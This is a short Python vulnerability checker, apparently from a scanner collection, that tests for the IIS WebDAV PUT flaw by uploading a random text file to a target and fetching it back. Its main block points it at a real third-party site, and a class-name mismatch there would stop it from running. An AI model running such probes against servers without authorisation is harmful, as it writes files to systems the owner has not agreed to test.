#!/usr/bin/env python3

'''
name: iis webdav put漏洞
description: iis webdav put漏洞
'''

import string
import random
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class Iis_Webdav_Put_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        }
        self.capta=''
        words=''.join((string.ascii_letters,string.digits))
        for i in range(8):
            self.capta = self.capta + random.choice(words)

    def run(self):
        file_name = self.capta
        file_content = self.capta
        url = self.url + "/" + self.capta + ".txt"
        try:
            req = requests.put(url, data = {'test': self.capta}, headers = self.headers, allow_redirects = False, verify=False)
            req_get = requests.get(url, headers = self.headers, allow_redirects = False, verify=False)
            if req_get.status_code == 200 and file_content in req_get.text:
                print('存在iis webdav put漏洞')
                return True
            else:
                print('不存在iis webdav put漏洞')
                return False
        except Exception as e:
            print(e)
            print('不存在iis webdav put漏洞')
            return False
        finally:
            pass

if  __name__ == "__main__":
    IIS_Webdav_Put = IIS_Webdav_Put_BaseVerify('https://blog.csdn.net')
    IIS_Webdav_Put.run()